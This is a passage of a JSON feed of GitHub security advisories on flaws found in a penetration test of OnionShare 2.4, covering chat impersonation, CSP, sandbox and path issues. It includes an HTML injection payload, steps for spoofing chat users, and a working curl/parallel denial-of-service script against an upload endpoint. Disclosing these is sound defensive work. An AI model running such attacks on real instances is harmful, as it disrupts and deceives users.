href=\"https://github.com/advisories/GHSA-68vr-8f46-vc9f\">https://github.com/advisories/GHSA-68vr-8f46-vc9f</a></p>\n</li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-68vr-8f46-vc9f",
            "title": "[onionshare-cli] Username spoofing in OnionShare",
            "date_modified": "2022-01-21T23:20:14.000Z",
            "date_published": "2022-01-21T23:20:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-68vr-8f46-vc9f"
            }
        },
        {
            "content_html": "<p>Between September 26, 2021 and October 8, 2021, <a href=\"https://www.radicallyopensecurity.com/\">Radically Open Security</a> conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's <a href=\"https://www.opentech.fund/labs/red-team-lab/\">Red Team lab</a>. This is an issue from that penetration test.</p>\n<ul>\n<li>Vulnerability ID: OTF-009</li>\n<li>Vulnerability type: Improper Access Control</li>\n<li>Threat level: Low</li>\n</ul>\n<h2 id=\"description\">Description:</h2>\n<p>Authenticated users (or unauthenticated in public mode) can send messages without being visible in the list of chat participants.</p>\n<h2 id=\"technical-description\">Technical description:</h2>\n<p>Prerequisites:</p>\n<ul>\n<li>Existing chatroom</li>\n<li>Access to the chatroom (Public or known Private Key)</li>\n<li>Either a modified frontend client or manual requests from burp/curl</li>\n</ul>\n<p>If a user opens the chatroom without emitting the join message he will not be present in session.users[x] list. Therefore there is no listing in the frontend and no chat participant knows another party joined the chat. It is still possible to send messages in the chatroom.</p>\n<p>If a user decides to abuse OTF-003 (page 22) he can impersonate messages from existing users; others would not be able to distinguish original and faked messages. This is also a prerequisite for OTF-004 (page 19).</p>\n<h2 id=\"impact\">Impact:</h2>\n<p>An adversary with access to the chat environment can send messages to the chat without being visible in the list of chat participants.</p>\n<h2 id=\"recommendation\">Recommendation:</h2>\n<ul>\n<li><p>Allow chat access only after emission of the join event.</p>\n</li>\n<li><p>Implement proper session handling.</p>\n<h3 id=\"references\">References</h3>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/security/advisories/GHSA-99p8-9p2c-49j4\">https://github.com/onionshare/onionshare/security/advisories/GHSA-99p8-9p2c-49j4</a></p>\n</li>\n<li><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21695\">https://nvd.nist.gov/vuln/detail/CVE-2022-21695</a></p>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/releases/tag/v2.5\">https://github.com/onionshare/onionshare/releases/tag/v2.5</a></p>\n</li>\n<li><p><a href=\"https://github.com/advisories/GHSA-99p8-9p2c-49j4\">https://github.com/advisories/GHSA-99p8-9p2c-49j4</a></p>\n</li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99p8-9p2c-49j4",
            "title": "[onionshare-cli] Improper Access Control in Onionshare",
            "date_modified": "2022-01-21T23:20:16.000Z",
            "date_published": "2022-01-21T23:20:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99p8-9p2c-49j4"
            }
        },
        {
            "content_html": "<p>Between September 26, 2021 and October 8, 2021, <a href=\"https://www.radicallyopensecurity.com/\">Radically Open Security</a> conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's <a href=\"https://www.opentech.fund/labs/red-team-lab/\">Red Team lab</a>. This is an issue from that penetration test.</p>\n<ul>\n<li>Vulnerability ID: OTF-006</li>\n<li>Vulnerability type: Broken Website Hardening Control</li>\n<li>Threat level: Low</li>\n</ul>\n<h2 id=\"description\">Description:</h2>\n<p>The CSP can be turned on or off but not configured for the specific needs of the website.</p>\n<h2 id=\"technical-description\">Technical description:</h2>\n<p>The website mode of the application allows to use a hardened CSP, which will block any scripts and external resources. It is not possible to configure this CSP for individual pages and therefore the security enhancement cannot be used for websites using javascript or external resources like fonts or images.</p>\n<p>If CSP were configurable, the website creator could harden it accordingly to the needs of the application.</p>\n<p>As this issue correlates with the Github issue for exposing the flask application directly (<a href=\"https://github.com/onionshare/\">https://github.com/onionshare/</a> onionshare/issues/1389), it can be assumed that this can be solved by either changing to a well-known webserver, which supports this kind of configuration, or enhancing the status quo by making the CSP a configurable part of each website.</p>\n<p>We believe that bundling the nginx or apache webserver would add complexity and dependencies to the application that could result in a larger attack surface - as these packages receive regular security updates. On the other hand it is not recommended to directly expose the flask webserver, due to lack of hardening. This is a trade-off which needs to be evaluated by the Onionshare developers, as multiple features are involved. Ideally the application user could choose between the built-in flask webserver or a system webserver of choice.</p>\n<h2 id=\"impact\">Impact:</h2>\n<p>As this is a general weakness and not a direct vulnerability in the Onionshare application, the direct impact of this issue is rather low.</p>\n<h2 id=\"recommendation\">Recommendation:</h2>\n<ul>\n<li><p>Consider offering a configurable webserver choice</p>\n</li>\n<li><p>Consider configurable CSP</p>\n<h3 id=\"references\">References</h3>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/security/advisories/GHSA-h29c-wcm8-883h\">https://github.com/onionshare/onionshare/security/advisories/GHSA-h29c-wcm8-883h</a></p>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/releases/tag/v2.5\">https://github.com/onionshare/onionshare/releases/tag/v2.5</a></p>\n</li>\n<li><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21694\">https://nvd.nist.gov/vuln/detail/CVE-2022-21694</a></p>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/issues/1389\">https://github.com/onionshare/onionshare/issues/1389</a></p>\n</li>\n<li><p><a href=\"https://github.com/advisories/GHSA-h29c-wcm8-883h\">https://github.com/advisories/GHSA-h29c-wcm8-883h</a></p>\n</li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h29c-wcm8-883h",
            "title": "[onionshare-cli] Incorrect Permission Assignment for Critical Resource in OnionShare",
            "date_modified": "2022-01-21T23:20:17.000Z",
            "date_published": "2022-01-21T23:20:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h29c-wcm8-883h"
            }
        },
        {
            "content_html": "<p>Between September 26, 2021 and October 8, 2021, <a href=\"https://www.radicallyopensecurity.com/\">Radically Open Security</a> conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's <a href=\"https://www.opentech.fund/labs/red-team-lab/\">Red Team lab</a>. This is an issue from that penetration test.</p>\n<ul>\n<li>Vulnerability ID: OTF-013</li>\n<li>Vulnerability type: Improper Hardening</li>\n<li>Threat level: Low</li>\n</ul>\n<h2 id=\"description\">Description:</h2>\n<p>The filesystem restriction could be hardened and should only allow for pre-defined subfolders.</p>\n<h2 id=\"technical-description\">Technical description:</h2>\n<p>The Flatpak and Snap configurations allow for read-only access on the whole home folder. The relevant lines in the configuration files are <code>onionshare/snap/snapcraft.yaml#L20</code> and <code>onionshare/flatpak/org.onionshare.OnionShare.yaml#L19</code> , respectively.</p>\n<p>The encapsulation of filesystem access via these mechanisms should be restricted to pre-defined folders and not allow for access to (configuration) files outside the Onionshare-specific folders.</p>\n<p>Sadly Snap does not allow for further restriction to specific folders and therefore cannot be further hardened. By default both frameworks disallow access to hidden folders and therefore reduce the potential impact.</p>\n<h2 id=\"impact\">Impact:</h2>\n<p>An adversary with a primitive that allows for filesystem access from the context of the Onionshare process can access sensitive files in the entire user home folder. This could lead to the leaking of sensitive data. Due to the automatic exclusion of hidden folders, the impact is reduced.</p>\n<h2 id=\"recommendation\">Recommendation:</h2>\n<ul>\n<li><p>Reduce read access in Flatpak configuration.</p>\n<h3 id=\"references\">References</h3>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/security/advisories/GHSA-jgm9-xpfj-4fq6\">https://github.com/onionshare/onionshare/security/advisories/GHSA-jgm9-xpfj-4fq6</a></p>\n</li>\n<li><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21693\">https://nvd.nist.gov/vuln/detail/CVE-2022-21693</a></p>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/releases/tag/v2.5\">https://github.com/onionshare/onionshare/releases/tag/v2.5</a></p>\n</li>\n<li><p><a href=\"https://github.com/advisories/GHSA-jgm9-xpfj-4fq6\">https://github.com/advisories/GHSA-jgm9-xpfj-4fq6</a></p>\n</li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgm9-xpfj-4fq6",
            "title": "[onionshare-cli] Path traversal in Onionshare",
            "date_modified": "2022-01-21T23:20:19.000Z",
            "date_published": "2022-01-21T23:20:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgm9-xpfj-4fq6"
            }
        },
        {
            "content_html": "<p>Between September 26, 2021 and October 8, 2021, <a href=\"https://www.radicallyopensecurity.com/\">Radically Open Security</a> conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's <a href=\"https://www.opentech.fund/labs/red-team-lab/\">Red Team lab</a>. This is an issue from that penetration test.</p>\n<ul>\n<li>Vulnerability ID: OTF-003</li>\n<li>Vulnerability type: Improper Access Control</li>\n<li>Threat level: Moderate</li>\n</ul>\n<h2 id=\"description\">Description:</h2>\n<p>Anyone with access to the chat environment can write messages disguised as another chat participant.</p>\n<h2 id=\"technical-description\">Technical description:</h2>\n<p>Prerequisites:</p>\n<ul>\n<li>Alice and Bob are legitimate users</li>\n<li>A third user has access to the chat environment</li>\n</ul>\n<p><img alt=\"otf-003-a\" src=\"https://user-images.githubusercontent.com/156128/140665707-1ecc897e-d33b-4f5b-b585-eb4475c1599f.png\"></p>\n<p>This screenshot shows Alice (<code>glimpse-depress</code>) and Bob (<code>blinker-doorpost</code>) joined a chatroom and are the only participants in the chatroom. Then the non-listed user squad-nursing writes a message in the chatroom without being visible in the list of users. The sending of the message itself is not required but was done here to show the initial access. The non-listed participant now renames himself to Bob and writes another message, seemingly coming from Bob.</p>\n<p>This can be reproduced by slightly modifying the client-side JavaScript. The <code>joined</code> emit needs to be removed from the <code>socket.on(connect) </code>event handler. Therefore a client is not listed in the userlist and has no active session.</p>\n<p><a href=\"https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/resources/static/js/chat.js#L16-L18\">https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/resources/static/js/chat.js#L16-L18</a></p>\n<p>This can be done either via a crafted client or runtime modification of the <code>chat.js</code> script in the browser's internal debugger.</p>\n<p>It is still possible to call the text method and send text to the chat via websocket.</p>\n<p><a href=\"https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/chat_mode.py#L131-L139\">https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/chat_mode.py#L131-L139</a></p>\n<p>It is also possible to call the <code>update_username</code> function and choose an existing username from the chat.</p>\n<p><a href=\"https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/chat_mode.py#L141-L162\">https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/chat_mode.py#L141-L162</a></p>\n<p>Afterwards the hidden user can send messages that are displayed as coming from the impersonated user. There is no way to distinguish between the fake and original message.</p>\n<h2 id=\"impact\">Impact:</h2>\n<p>An adversary with access to the chat environment can impersonate existing chat participants and write messages but not read the conversation. The similar exploit described in OTF-004 (page 19) has only slightly more requirements but also allows for reading.</p>\n<h2 id=\"recommendation\">Recommendation:</h2>\n<ul>\n<li><p>Implement proper session handling</p>\n<h3 id=\"references\">References</h3>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/security/advisories/GHSA-gjj5-998g-v36v\">https://github.com/onionshare/onionshare/security/advisories/GHSA-gjj5-998g-v36v</a></p>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/releases/tag/v2.5\">https://github.com/onionshare/onionshare/releases/tag/v2.5</a></p>\n</li>\n<li><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21692\">https://nvd.nist.gov/vuln/detail/CVE-2022-21692</a></p>\n</li>\n<li><p><a href=\"https://github.com/advisories/GHSA-gjj5-998g-v36v\">https://github.com/advisories/GHSA-gjj5-998g-v36v</a></p>\n</li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gjj5-998g-v36v",
            "title": "[onionshare-cli] Improper Access Control in Onionshare",
            "date_modified": "2022-01-21T23:20:21.000Z",
            "date_published": "2022-01-21T23:20:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gjj5-998g-v36v"
            }
        },
        {
            "content_html": "<p>Between September 26, 2021 and October 8, 2021, <a href=\"https://www.radicallyopensecurity.com/\">Radically Open Security</a> conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's <a href=\"https://www.opentech.fund/labs/red-team-lab/\">Red Team lab</a>. This is an issue from that penetration test.</p>\n<ul>\n<li>Vulnerability ID: OTF-004</li>\n<li>Vulnerability type: Improper Access Control</li>\n<li>Threat level: Moderate</li>\n</ul>\n<h2 id=\"description\">Description:</h2>\n<p>Chat participants can spoof their channel leave message, tricking others into assuming they left the chatroom.</p>\n<h2 id=\"technical-description\">Technical description:</h2>\n<p><img alt=\"otf-004-a\" src=\"https://user-images.githubusercontent.com/156128/140665619-e51cfac0-a60a-4c2f-9c8e-be26066e6f3f.png\">\n<img alt=\"otf-004-b\" src=\"https://user-images.githubusercontent.com/156128/140665620-5d7c2770-c83f-4925-8912-f2849071a3b0.png\">\n<img alt=\"otf-004-c\" src=\"https://user-images.githubusercontent.com/156128/140665622-78a71ace-c483-4b16-b205-481aafe7ff87.png\"></p>\n<p>This series of screenshots show Alice, Bob and Eve joined a chatroom and are the only participants in the chatroom. Eve seemingly leaves the chatroom, which leads Bob and Alice to believe they are having a private chat. The last screenshot shows that Eve only emitted the leave message and is still able to read the chat and possibly write messages.</p>\n<p>This can be reproduced by joining the chat with two different instances, where one instance has slightly modified the client-side JavaScript code similar to OTF-003 (page 22). The joined emit needs to be removed from the connect event handler. Therefore the modified client is not listed in the userlist and has no active session. The modified non-listed user also needs to change their username to Eve, which is not shown in the chatroom. The modified client then emits the disconnect event and their connection is no longer usable.</p>\n<p>This results in the leave message for Eve and the removal from the user-list but not in removal of the original session of the Eve who announced to join the chat.</p>\n<h2 id=\"impact\">Impact:</h2>\n<p>An adversary with access to the chat environment can spoof his leave event but still persist in the chat with access to all sent messages and the possibility to write in the chat using OTF-003 (page 22).</p>\n<h2 id=\"recommendation\">Recommendation:</h2>\n<ul>\n<li><p>Implement proper session handling</p>\n<h3 id=\"references\">References</h3>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/security/advisories/GHSA-w9m4-7w72-r766\">https://github.com/onionshare/onionshare/security/advisories/GHSA-w9m4-7w72-r766</a></p>\n</li>\n<li><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21691\">https://nvd.nist.gov/vuln/detail/CVE-2022-21691</a></p>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/releases/tag/v2.5\">https://github.com/onionshare/onionshare/releases/tag/v2.5</a></p>\n</li>\n<li><p><a href=\"https://github.com/advisories/GHSA-w9m4-7w72-r766\">https://github.com/advisories/GHSA-w9m4-7w72-r766</a></p>\n</li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w9m4-7w72-r766",
            "title": "[onionshare-cli] Improper Access Control in Onionshare",
            "date_modified": "2022-01-25T20:52:18.000Z",
            "date_published": "2022-01-21T23:20:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w9m4-7w72-r766"
            }
        },
        {
            "content_html": "<p>Between September 26, 2021 and October 8, 2021, <a href=\"https://www.radicallyopensecurity.com/\">Radically Open Security</a> conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's <a href=\"https://www.opentech.fund/labs/red-team-lab/\">Red Team lab</a>. This is an issue from that penetration test.</p>\n<ul>\n<li>Vulnerability ID: OTF-001</li>\n<li>Vulnerability type: Improper Input Sanitization</li>\n<li>Threat level: Elevated</li>\n</ul>\n<h2 id=\"description\">Description:</h2>\n<p>The <code>path</code> parameter of the requested URL is not sanitized before being passed to the QT frontend.</p>\n<h2 id=\"technical-description\">Technical description:</h2>\n<p>The <code>path</code> parameter is not sanitized before being passed to the constructor of the <code>QLabel</code>.</p>\n<p><a href=\"https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/desktop/src/onionshare/tab/mode/__init__.py#L499-L509\">https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/desktop/src/onionshare/tab/mode/__init__.py#L499-L509</a></p>\n<p><a href=\"https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/desktop/src/onionshare/tab/mode/history.py#L456-L483\">https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/desktop/src/onionshare/tab/mode/history.py#L456-L483</a></p>\n<p><a href=\"https://doc.qt.io/qt-5/qlabel.html#details\">https://doc.qt.io/qt-5/qlabel.html#details</a></p>\n<blockquote>\n<p>Warning: When passing a QString to the constructor or calling setText(), make sure to sanitize your input, as QLabel tries to guess whether it displays the text as plain text or as rich text, a subset of HTML 4 markup. You may want to call setTextFormat() explicitly, e.g. in case you expect the text to be in plain format but cannot control the text source (for instance when displaying data loaded from the Web).</p>\n</blockquote>\n<p>This path is used in all components for displaying the server access history. This leads to a rendered HTML4 Subset (QT RichText editor) in the Onionshare frontend.</p>\n<p>In the following example an adversary injects a crafted image file into an Onionshare instance with receive mode and renders it in the history component of the Onionshare application.</p>\n<p>The only requirement is another visit to the shared site with the following parameter attached to the path of the URL:</p>\n<pre><code>&lt;img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAAFElEQVQY02Nk+M+ABzAxMIxKYwIAQC0BEwZFOw4AAAAASUVORK5CYII=' /&gt;\n</code></pre>\n<p>This will be rendered as a green square in the history tab where the path value is supposed to be (the value itself is shown at the bottom of the page).</p>\n<p><img alt=\"otf-001\" src=\"https://user-images.githubusercontent.com/156128/140665358-ab9e5990-3e13-4e50-85fd-b8a6e323d299.png\"></p>\n<p>Possible scenarios where this could lead to remote code execution would be a 0-day in libpng or other internal image rendering (OTF-014 (page 12)) of the QT framework.</p>\n<p>The QT documentation indicates that external files could be rendered, but we were unable to find a QT code path allowing for it.</p>\n<h2 id=\"impact\">Impact:</h2>\n<p>An adversary with knowledge of the Onion service address in public mode or with authentication in private mode can render arbitrary HTML (QT-HTML4 Subset) in the server desktop application. This requires the desktop application with rendered history, therefore the impact is only elevated.</p>\n<h2 id=\"recommendation\">Recommendation:</h2>\n<ul>\n<li><p>Manually define the text format of the QLabel via <code>setTextFormat()</code></p>\n<h3 id=\"references\">References</h3>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/security/advisories/GHSA-ch22-x2v3-v6vq\">https://github.com/onionshare/onionshare/security/advisories/GHSA-ch22-x2v3-v6vq</a></p>\n</li>\n<li><p><a href=\"https://github.com/onionshare/onionshare/releases/tag/v2.5\">https://github.com/onionshare/onionshare/releases/tag/v2.5</a></p>\n</li>\n<li><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21690\">https://nvd.nist.gov/vuln/detail/CVE-2022-21690</a></p>\n</li>\n<li><p><a href=\"https://github.com/advisories/GHSA-ch22-x2v3-v6vq\">https://github.com/advisories/GHSA-ch22-x2v3-v6vq</a></p>\n</li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ch22-x2v3-v6vq",
            "title": "[onionshare-cli] OTF-001: Improper Input Sanitation: The path parameter of the requested URL is not sanitized before being passed to the QT frontend",
            "date_modified": "2022-01-21T23:20:25.000Z",
            "date_published": "2022-01-21T23:20:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ch22-x2v3-v6vq"
            }
        },
        {
            "content_html": "<p>Between September 26, 2021 and October 8, 2021, <a href=\"https://www.radicallyopensecurity.com/\">Radically Open Security</a> conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's <a href=\"https://www.opentech.fund/labs/red-team-lab/\">Red Team lab</a>.</p>\n<ul>\n<li>Vulnerability ID: OTF-012</li>\n<li>Vulnerability type: Denial of Service</li>\n<li>Threat level: Moderate</li>\n</ul>\n<h2 id=\"description\">Description:</h2>\n<p>The receive mode limits concurrent uploads to 100 per second and blocks other uploads in the same second, which can be triggered by a simple script.</p>\n<h2 id=\"technical-description\">Technical description:</h2>\n<p>The following script uses GNU parallel and curl with around 6000 requests in parallel to send 10000 requests. A change in the <code>ulimit -n</code> configuration is required for it to work. This is sufficient to block file upload on a (public) receive instance.</p>\n<pre><code>seq 10000 | parallel --max-args 0 --jobs 6000 \"curl -i -s -x socks5h://localhost:9150 -k -X $'POST' -H $'Host: csqrp3qciewvj5axph4o62jnr6aevhmpxfkydmi3256bprhbusr2ltid.onion' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------19182376703918074873375387042' -H $'Content-Length: 329' -H $'Connection: close' --data-binary $'-----------------------------19182376703918074873375387042\\x0d\\x0aContent-Disposition: form-data; name=\\\"file[]\\\"; filename=\\\"poc.txt\\\"\\x0d\\x0aContent-Type: text/plain\\x0d\\x0a\\x0d\\x0aA\\x0d\\x0a-----------------------------19182376703918074873375387042\\x0d\\x0aContent-Disposition: form-data; name=\\\"text\\\"\\x0d\\x0a\\x0d\\x0a\\x0d\\x0a-----------------------------19182376703918074873375387042--\\x0d\\x0a' $'http://csqrp3qciewvj5axph4o62jnr6aevhmpxfkydmi3256bprhbusr2ltid.onion/upload-ajax'\"\n</code></pre>\n<p>Attack duration was around 80 seconds.</p>\n<p>Cases where over 99 requests were sent per second:</p>\n<pre><code>Every 0.1s: ls | grep...   onionvm: Tue Oct 5 12:17:00 2021\n78\n</code></pre>\n<p>Cases where files were successfully written to disk:</p>\n<pre><code>Every 0.1s: ls | wc -w   onionvm: Tue Oct 5 12:17:00 2021\n8399\n</code></pre>\n<p>This means that during the attack time 1601 requests of 10000 were dropped. We tried to upload multiple files in the web interface during the attack and were not successful.</p>\n<p>The failsafe is used to prevent creating more than 100 directories per second:</p>\n<p><a href=\"https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/receive_mode.py#L386-L427\">https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/receive_mode.py#L386-L427</a></p>\n<p>The limit of 100 requests/second is significantly lower than the possible network bandwidth and greatly reduces the attack complexity for denial of service. Our test was conducted over the tor network, which showed no limitation for the required bandwidth.</p>\n<h2 id=\"impact\">Impact:</h2>\n<p>An adversary with access to the receive mode can block file upload for others. There is no way to block this attack in public mode due to the anonymity properties of the tor network.</p>\n<h2 id=\"recommendation\">Recommendation:</h2>\n<ul>\n<li>Remove this limitation, or</li>\n<li>Derive directory name from milliseconds</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/onionshare/onionshare/security/advisories/GHSA-jh82-c5jw-pxpc\">https://github.com/onionshare/onionshare/security/advisories/GHSA-jh82-c5jw-pxpc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21689\">https://nvd.nist.gov/vuln/detail/CVE-2022-21689</a></li>\n<li><a href=\"https://github.com/onionshare/onionshare/releases/tag/v2.5\">https://github.com/onionshare/onionshare/releases/tag/v2.5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jh82-c5jw-pxpc\">https://github.com/advisories/GHSA-jh82-c5jw-pxpc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jh82-c5jw-pxpc",
            "title": "[onionshare-cli] Denial of Service in Onionshare",
            "date_modified": "2022-01-21T23:20:27.000Z",
            "date_published": "2022-01-21T23:20:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jh82-c5jw-pxpc"
            }
        }
    ]
}